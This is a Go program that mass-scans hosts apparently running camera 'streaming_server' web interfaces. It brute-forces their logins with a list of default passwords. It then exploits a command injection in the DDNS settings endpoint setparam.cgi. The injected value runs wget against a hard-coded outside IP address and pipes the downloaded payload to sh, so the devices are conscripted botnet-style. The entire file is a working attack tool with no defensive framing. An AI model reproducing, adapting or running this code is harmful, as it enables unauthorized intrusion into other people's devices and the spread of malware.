package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	total     int
	found     int
	logined   int
	exploited int

	wg sync.WaitGroup

	search_string = "streaming_server" //query too

	user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
	payload    = "%24%28wget%20http%3A%2F%2F45.128.232.86%2F" + os.Args[3] + "%20-O-%20%7C%20sh%29"
	form       = "ddns_enable=0&ddns_provider=DyndnsDynamic&ddns_DyndnsDynamic_hostname=1.1.1.1&ddns_DyndnsDynamic_usernameemail=" + payload + "&ddns_DyndnsDynamic_passwordkey=root&ddns_DyndnsCustom_hostname=&ddns_DyndnsCustom_usernameemail=&ddns_DyndnsCustom_passwordkey=&ddns_TZO_hostname=&ddns_TZO_usernameemail=&ddns_TZO_passwordkey=&ddns_DHS_hostname=&ddns_DHS_usernameemail=&ddns_DHS_passwordkey=&ddns_DynInterfree_hostname=&ddns_DynInterfree_usernameemail=&ddns_DynInterfree_passwordkey="
)

var logins = [...]string{"admin:", "root:root", "admin:admin", "admin:123456", "admin:654321", "admin:0000", "admin:1111", "admin:admin123", "admin:1234", "admin:12345"}

func get_buf(conn net.Conn) string {
	buf := make([]byte, 512)
	conn.Read(buf)

	return string(buf)
}

func check_host(host string) bool {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		return false
	}

	defer conn.Close()

	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", host, user_agent)

	buf := get_buf(conn)

	return strings.Contains(strings.ToLower(buf), search_string)
}

func check_login(host string) string {
	for i := 0; i < len(logins); i++ {
		conn, err := net.Dial("tcp", host)
		if err != nil {
			return "error"
		}

		auth := base64.StdEncoding.EncodeToString([]byte(logins[i]))

		fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAuthorization: Basic %s\r\n\r\n", host, user_agent, auth)

		buf := get_buf(conn)

		if strings.Contains(buf, "200 OK") {
			return logins[i]
		}
	}

	return "error"
}

func process_host(host string) {
	total++

	wg.Add(1)

	defer wg.Done()

	if !check_host(host) {
		return
	}

	found++

	auth := check_login(host)

	if auth == "error" {
		return
	}

	logined++

	bauth := base64.StdEncoding.EncodeToString([]byte(auth))

	conn, err := net.Dial("tcp", host)
	if err != nil {
		return
	}

	defer conn.Close()

	fmt.Fprintf(conn, "POST /cgi-bin/admin/setparam.cgi HTTP/1.1\r\nHost: %s\r\nAuthorization: Basic %s\r\nUser-Agent: %s\r\nContent-Length: %d\r\nConnection: keep-alive\r\nCookie: activatedmode=mechanical; viewsizemode=100; 4x3=false; g_mode=1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Language: en-US,en;q=0.9\r\nContent-Type: application/x-www-form-urlencoded\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nReferer: http://%s/setup/network/ddns.html\r\nOrigin: http://%s\r\n\r\n%s", host, bauth, user_agent, len(form), host, host, form)

	buf := get_buf(conn)

	if strings.Contains(buf, "ddns_enable=") {
		fmt.Printf("exploited %s (%s %s)\r\n", host, auth, bauth)
		exploited++
	} else {
		//fmt.Printf("%s\r\n", buf)
	}

	/*	/*syscmd := fmt.Sprintf("curl 'http://%s/cgi-bin/admin/setparam.cgi'
		-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*;q=0.8,application/signed-exchange;v=b3;q=0.7'
		-H 'Accept-Language: en-US,en;q=0.9'
		-H 'Authorization: Basic %s'
		-H 'Cache-Control: max-age=0'
		-H 'Connection: keep-alive'
		-H 'Content-Type: application/x-www-form-urlencoded'
		-H 'Cookie: activatedmode=digital; g_mode=1; framelevel=8; viewsizemode=100; 4x3=false'
		-H 'Origin: http://%s'
		-H 'Referer: http://%s/setup/network/ddns.html'
		-H 'Upgrade-Insecure-Requests: 1'   -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
		--data-raw '%s'
		--compressed
		--insecure",
		host, bauth, host, host, form)*/

}

func title_writer() {
	i := 0

	for {
		time.Sleep(1 * time.Second)

		fmt.Printf("[%d's] Total [%d] - Found [%d] - Logins [%d] - Exploited [%d]\r\n", i, total, found, logined, exploited)
		i++
	}
}

func main() {
	go title_writer()

	scan := bufio.NewScanner(os.Stdin)

	runtimeMax, _ := strconv.Atoi(os.Args[2])

	for scan.Scan() {
		for runtime.NumGoroutine() > runtimeMax {
			time.Sleep(1 * time.Second)
		}

		if os.Args[1] == "manual" {
			go process_host(scan.Text())
		} else {
			go process_host(scan.Text() + ":" + os.Args[1])
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
